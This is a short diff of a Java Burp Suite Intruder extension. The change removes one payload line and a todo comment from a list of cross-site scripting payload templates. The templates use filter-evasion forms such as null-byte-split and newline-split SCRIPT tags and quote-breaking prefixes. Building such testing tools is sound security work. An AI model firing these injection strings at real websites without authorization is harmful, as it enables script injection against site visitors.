@@ -83,7 +83,6 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IIntrud
 		("';{FUNCTION}('" + triggerPhrase + "');'").getBytes(),
 		(";{FUNCTION}('" + triggerPhrase + "');").getBytes(),
 		("<SCR%00IPT>{FUNCTION}(\\\"" + triggerPhrase + "\\\")</SCR%00IPT>").getBytes(),
-		("<SCRIPT>a=/" + triggerPhrase + "/").getBytes(),
 		("\\\";{FUNCTION}('" + triggerPhrase + "');//").getBytes(),
 		("<STYLE TYPE=\"text/javascript\">{FUNCTION}('" + triggerPhrase + "');</STYLE>").getBytes(),
 		("<scr\nipt>{FUNCTION}('" + triggerPhrase + "')</scr\nipt>").getBytes(),
@@ -237,8 +236,6 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IIntrud
 	 * 
 	 * In this case, simply iterate over the payloads defined
 	 * in the parent class.	
-	 * 
-	 * @todo: Added processing for different functions
 	 */
 	class IntruderPayloadGenerator implements IIntruderPayloadGenerator {
 		int payloadIndex;
@@ -260,7 +257,6 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IIntrud
 				functionIndex = 0;
 				payloadIndex++;
 			}
-			
 			
 			String nextPayload = new String(payload);
 			nextPayload =  nextPayload.replace("{FUNCTION}", functions[functionIndex]);
